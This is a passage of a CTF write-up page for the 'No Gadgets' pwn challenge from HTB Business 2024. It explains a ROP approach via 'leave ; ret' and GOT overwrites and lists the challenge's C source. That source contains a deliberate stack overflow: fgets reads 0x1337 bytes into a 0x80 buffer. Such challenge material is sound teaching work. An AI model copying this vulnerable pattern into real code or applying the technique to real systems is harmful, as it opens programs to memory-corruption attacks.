<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-ctf-writeups/htb-business-2024/no-gadgets" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">No Gadgets | My Site</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://0xa5h.com/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://0xa5h.com/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://0xa5h.com/pwn/ctf-writeups/htb-business-2024/no-gadgets"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="No Gadgets | My Site"><meta data-rh="true" name="description" content="ROPing using `leave ; ret` rather than `pop rdi ; ret`"><meta data-rh="true" property="og:description" content="ROPing using `leave ; ret` rather than `pop rdi ; ret`"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://0xa5h.com/pwn/ctf-writeups/htb-business-2024/no-gadgets"><link data-rh="true" rel="alternate" href="https://0xa5h.com/pwn/ctf-writeups/htb-business-2024/no-gadgets" hreflang="en"><link data-rh="true" rel="alternate" href="https://0xa5h.com/pwn/ctf-writeups/htb-business-2024/no-gadgets" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"CTF writeups","item":"https://0xa5h.com/pwn/category/ctf-writeups"},{"@type":"ListItem","position":2,"name":"HTB Business 2024","item":"https://0xa5h.com/pwn/category/htb-business-2024"},{"@type":"ListItem","position":3,"name":"No Gadgets","item":"https://0xa5h.com/pwn/ctf-writeups/htb-business-2024/no-gadgets"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="My Site RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="My Site Atom Feed"><link rel="stylesheet" href="/assets/css/styles.b304860a.css">
<script src="/assets/js/runtime~main.4984d3b9.js" defer="defer"></script>
<script src="/assets/js/main.aa702dda.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><link rel="preload" as="image" href="/assets/fgets.png"><link rel="preload" as="image" href="/assets/got (1).png"><link rel="preload" as="image" href="/assets/writable_memory.png"><link rel="preload" as="image" href="/assets/gdb1.png"><link rel="preload" as="image" href="/assets/gdb2.png"><link rel="preload" as="image" href="/assets/Screenshot 2024-05-22 165139 (1).png"><link rel="preload" as="image" href="/assets/image (115).png"><link rel="preload" as="image" href="/assets/image (129).png"><link rel="preload" as="image" href="/assets/image (130).png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">My Site</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/pwn/">Tutorial</a><a class="navbar__item navbar__link" href="/blog">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/pwn/">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/pwn/category/pwn">pwn</a><button aria-label="Expand sidebar category &#x27;pwn&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/pwn/category/ctf-writeups">CTF writeups</a><button aria-label="Collapse sidebar category &#x27;CTF writeups&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/pwn/category/htb-business-2024">HTB Business 2024</a><button aria-label="Collapse sidebar category &#x27;HTB Business 2024&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/pwn/ctf-writeups/htb-business-2024/no-gadgets">No Gadgets</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/pwn/category/corctf-2024">corCTF 2024</a><button aria-label="Expand sidebar category &#x27;corCTF 2024&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/pwn/category/dicectf-2025">diceCTF 2025</a><button aria-label="Expand sidebar category &#x27;diceCTF 2025&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/pwn/category/test">Test</a><button aria-label="Expand sidebar category &#x27;Test&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/pwn/category/ctf-writeups"><span>CTF writeups</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/pwn/category/htb-business-2024"><span>HTB Business 2024</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">No Gadgets</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>No Gadgets</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="background">Background<a href="#background" class="hash-link" aria-label="Direct link to Background" title="Direct link to Background">​</a></h2>
<p><code>No Gadgets</code> was an easy rated pwn I created for this CTF. The premise was based around the fact that <code>pop rdi ; ret</code> is no longer present in binaries compiled against glibc <code>2.34+</code>. While a lot of challenges will add this gadget back in manually, I wondered whether you could still solve an overflow challenge without this seemingly essential gadget.</p>
<p>The process of crafting this challenge is what lead me to discover some of the techniques that I&#x27;ve detailed in <a href="/pwn/pwn/rop-2.34+/the-problem">this section</a> of my blog, including the <code>gets</code> techniques.</p>
<p>I decided that using <code>gets</code> would make the challenge trivial, so I purposefully decided to not use it, instead opting for using <code>leave ; ret</code> to control <code>rbp</code>, which allowed you to get arbitrary writes to the <code>GOT</code>.</p>
<p>Anyways, enough yapping, onto the challenge itself.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="analysis">Analysis<a href="#analysis" class="hash-link" aria-label="Direct link to Analysis" title="Direct link to Analysis">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="analyzing-the-source-code">Analyzing the source code<a href="#analyzing-the-source-code" class="hash-link" aria-label="Direct link to Analyzing the source code" title="Direct link to Analyzing the source code">​</a></h3>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdlib.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;string.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name" style="color:#36acaa">BANNER</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;———————————————————————————————\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⣞⢽⢪⢣⢣⢣⢫⡺⡵⣝⡮⣗⢷⢽⢽⢽⣮⡷⡽⣜⣜⢮⢺⣜⢷⢽⢝⡽⣝\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠸⡸⠜⠕⠕⠁⢁⢇⢏⢽⢺⣪⡳⡝⣎⣏⢯⢞⡿⣟⣷⣳⢯⡷⣽⢽⢯⣳⣫⠇\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⠀⢀⢀⢄⢬⢪⡪⡎⣆⡈⠚⠜⠕⠇⠗⠝⢕⢯⢫⣞⣯⣿⣻⡽⣏⢗⣗⠏⠀\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⠪⡪⡪⣪⢪⢺⢸⢢⢓⢆⢤⢀⠀⠀⠀⠀⠈⢊⢞⡾⣿⡯⣏⢮⠷⠁⠀⠀ \n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⠀⠀⠈⠊⠆⡃⠕⢕⢇⢇⢇⢇⢇⢏⢎⢎⢆⢄⠀⢑⣽⣿⢝⠲⠉⠀⠀⠀⠀\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⠀⠀⠀⠀⡿⠂⠠⠀⡇⢇⠕⢈⣀⠀⠁⠡⠣⡣⡫⣂⣿⠯⢪⠰⠂⠀⠀⠀⠀\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⠀⠀⠀⡦⡙⡂⢀⢤⢣⠣⡈⣾⡃⠠⠄⠀⡄⢱⣌⣶⢏⢊⠂⠀⠀⠀⠀⠀⠀\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⠀⠀⠀⢝⡲⣜⡮⡏⢎⢌⢂⠙⠢⠐⢀⢘⢵⣽⣿⡿⠁⠁⠀⠀⠀⠀⠀⠀⠀\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⠀⠀⠀⠨⣺⡺⡕⡕⡱⡑⡆⡕⡅⡕⡜⡼⢽⡻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⠀⠀⠀⣼⣳⣫⣾⣵⣗⡵⡱⡡⢣⢑⢕⢜⢕⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⠀⠀⣴⣿⣾⣿⣿⣿⡿⡽⡑⢌⠪⡢⡣⣣⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⠀⠀⡟⡾⣿⢿⢿⢵⣽⣾⣼⣘⢸⢸⣞⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;⠀⠀⠀⠀⠁⠇⠡⠩⡫⢿⣝⡻⡮⣒⢽⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n&quot;</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa"></span><span class="token macro property string" style="color:#e3116c">&quot;——————————No gadgets?——————————\n&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">setup</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">setvbuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _IONBF</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">setvbuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdout</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _IONBF</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">setvbuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stderr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _IONBF</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">setup</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">BANNER</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Welcome to No Gadgets, the ropping experience with absolutely no gadgets!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Data: &quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">fgets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1337</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Woah buddy, you&#x27;ve entered so much data that you&#x27;ve reached the point of no return!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token function" style="color:#d73a49">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">EXIT_FAILURE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Pathetic, &#x27;tis but a scratch!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
